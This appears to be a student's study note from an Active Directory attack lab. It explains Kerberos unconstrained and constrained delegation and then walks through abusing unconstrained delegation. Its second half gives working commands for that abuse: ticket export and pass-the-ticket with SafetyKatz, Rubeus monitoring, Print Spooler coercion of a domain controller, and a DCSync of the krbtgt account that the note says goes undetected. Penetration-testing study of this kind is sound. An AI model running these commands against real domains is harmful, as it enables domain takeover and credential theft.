- Kerberos Delegation has been summoned on this planet for only one purpose, which is what Microsoft defines it as: "Kerberos Delegation allows to reuse the end-user credentials to access resources hosted on a different server".
- This is typically useful in multi-tier applications where Kerberos Double Hop is required. For example if we consider a web application that requires Kerberos authentication, and also has a Database server that it has to make authenticated requests to, Kerberos Delegation in this scenario enables us to re-use the credential we used to authenticate to the web server to send an authenticated request to the Database server.
- Why would we need to go through this at all?
	- Because access to the information in the Database could be user or role specific in nature, and require authentication.
- ![[Pasted image 20250803031054.png]]
	- The goal of Kerberos Delegation is User Impersonation.

#### The Kerberos Double Hop Problem
- If we authenticate to a machine (assuming `dcorp-adminsrv` (first hop)), and get access to it as the current user we are (assuming `student1`), and try to perform an action on the DC (second hop) which should be permissible for `student1` (like trying to list all the users from the DC), we may end up facing an authentication issue or access denied error code, this is because the first hop (`dcorp-adminsrv`) is not allowed to delegate our user's (`student1`) credentials to the DC.
- This is known as the Kerberos Double Hop Problem, and is a security control. This is what Kerberos Delegation aims to resolve, in situations where we want it to be the other way instead, this is why we earlier defined its aim as "User Impersonation".
- A stupid way to try to resolve the Kerberos Double Hop problem without using Kerberos Delegation is to use CredSSP instead.
	- CredSSP caches the user credentials in clear-text on the first hop, and when the server has to connect to the second hop, these clear-text credentials are used to authenticate to the second hop directly.

#### Types of Kerberos Delegation
- There are two types of Kerberos Delegation:
	- General/Basic or Unconstrained Delegation:
		- Allows the first hop to request access to any resource in the domain as a user.
		- When unconstrained delegation is enabled, the DC places the user's TGT inside TGS. On the first hop, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the TGT to access any other resource as the user.
		- This is obviously ripe for abuse!
		- Unconstrained Delegation Authentication Flow:
			- ![[image (1).png]]
				1. Pre-authentication: A timestamp is encrypted, signed using the user's credentials and sent to the DC.
				2. The DC validates it and returns a TGT.
				3. The user sends the TGT back to the DC, and requests a TGS.
				4. At this step, the DC says wait a minute and checks that the SPN for the service the TGS is requested has Unconstrained Delegation, and then the DC provides a TGS.
					- When the DC generates the TGS, it puts the TGT of the user inside the TGS.
				5. The user presents this to the web server (first hop).
					- Can the web server (first hop) decrypt the TGS, which holds the TGT?
						- Yes! The TGS is encrypted using the secrets of the service account of the web server, once it decrypts the TGS, it will have the user account's TGT.
				6. The web server service account presents the user's TGT to the DC, to request a Service Ticket for the DB Server (i.e. the second hop); and gets it.
					- The only validation done that is done by the DC to validate a TGT is to see if the KDC can decrypt it.
				7. The web server (first hop) can now access the DB server (second hop), as the user.
			- If the authenticated user here is a DC, or any other high privilege user, all we need to do is to compromise the first hop.
		- When Unconstrained Delegation was initially introduced in the 2000s, its most widely known use case was for web applications, which made it a goldmine for hackers.
		- Unconstrained Delegation is not as prevalent as it used to be, but is very interesting to know about, and may be present in modern environments to maintain legacy compatibility.
	- Constrained Delegation:
		- Allows the first hop to request access only to specified services on specified computers.
		- If Kerberos authentication is not used to authenticate to the first hop, Protocol Transition is used to transition the request to Kerberos.

#### Abusing Unconstrained Delegation
- Discovering domain computers with Unconstrained Delegation enabled:
	- Using PowerView:
		- `Get-DomainComputer -UnConstrained`
	- Using AD Module:
		- `Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
		- `Get-ADUser -Filter {TrustedForDelegation -eq $True}`
	- Using BloodHound
- Next we will perform the most important step, which is compromising the server(s) where Unconstrained Delegation is enabled:
	- In our environments `dcorp-appsrv` is the target server.
	- We must trick or wait a domain admin to connect to the target server, as soon as they do we can export the tickets, and use it to get DA privileges:
		- Exporting the tickets after the victim connects to the machine:
			- `SafetyKatz.exe "sekurlsa::tickets /export"`
		- Reusing the DA token:
			- `SafetyKatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"`
- However, in this case, we need to wait for a DA to connect to the target server, to avoid this we can use coercion to force the victim to connect to the target server.

#### Unconstrained Delegation - Coercion
- Certain Microsoft services and protocols allow any authenticated user to force a machine to connect to a second machine.
- As of January 2025, following protocols and services can be used for coercion:
	- ![[Pasted image 20250804050050.png]]
	- If a machine has for example the Print Spooler service enabled (which is turned on by default for all server OS), and if we have domain user access, we can connect to it and tell it to connect to a second machine, like so:
		- ![[image 2.png]]
- Performing the attack:
	- `dcorp-appsrv` is the machine in our environment that has Unconstrained Delegation enabled. Once we compromise it, we will run Rubeus on it in monitor mode:
		- `Rubeus.exe monitor /interval:5 /nowrap`
			- Rubeus would monitor for TGTs of the DC, we are going to force the DC to connect to `dcorp-appsrv`.
	- And after that, we can use [`MS-RPRN.exe`](https://github.com/leechristensen/SpoolSample) (or any other tool, depending on what we want to use) on the student VM to force the DC to connect to `dcorp-appsrv`:
		- `MS-RPN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
	- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on a student VM:
		- `Rubeus.exe ptt /ticket:<TGT base64 hash>`
	- Once we have the TGT of the DC, we can run the DCSync attack, this DCSync attack will not get detected, since we run it using the TGT of the DC:
		- `SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"`